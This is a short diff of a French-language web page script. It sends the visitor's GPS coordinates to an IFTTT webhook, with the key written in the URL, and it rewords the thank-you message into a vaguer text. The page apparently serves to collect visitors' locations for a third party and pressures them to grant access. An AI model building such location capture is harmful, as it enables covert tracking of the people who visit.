@@ -37,7 +37,7 @@
       // Envoie des coordonnées GPS à IFTTT
       fetch("https://maker.ifttt.com/trigger/gps_event/with/key/wOjzYcX9cJALQ-uu5BX_z?value1=" + lat + "&value2=" + lon);
 
-      document.body.innerHTML = "<h2>Merci ✅</h2><p>Votre position a été confirmée. Vous pouvez fermer la page.</p>";
+      document.body.innerHTML = "<h2>Merci ✅</h2><p>vos données ont bien été enregistrées. Ce message peut être ignoré.</p>";
     }, function(error) {
       document.body.innerHTML = "<h2>⚠️ Autorisation de localisation refusée</h2><p>Veuillez autoriser l’accès à votre position pour continuer.</p>";
     });
